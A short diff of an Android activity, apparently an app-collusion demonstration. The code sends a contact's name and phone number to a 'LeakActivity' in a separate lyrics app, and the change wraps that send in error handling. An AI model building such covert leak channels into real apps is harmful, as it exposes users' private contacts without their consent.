@@ -72,12 +72,16 @@ public class EncodeActivity extends AppCompatActivity {
                             jsonContact = JsonFactory.ContactToJson(name, phn_no);
 
                             // Leak data to lyrics app
-                            Intent intent = new Intent();
-                            intent.setComponent(new ComponentName(
-                                    "xyz.praveen.lyricx",
-                                    "xyz.praveen.lyricx.LeakActivity"));
-                            intent.putExtra("leakData", jsonContact);
-                            startActivity(intent);
+                            try {
+                                Intent intent = new Intent();
+                                intent.setComponent(new ComponentName(
+                                        "xyz.praveen.lyricx",
+                                        "xyz.praveen.lyricx.LeakActivity"));
+                                intent.putExtra("leakData", jsonContact);
+                                startActivity(intent);
+                            } catch (Exception e) {
+                                Toast.makeText(context, "No leak!", Toast.LENGTH_SHORT).show();
+                            }
                         }
 
 
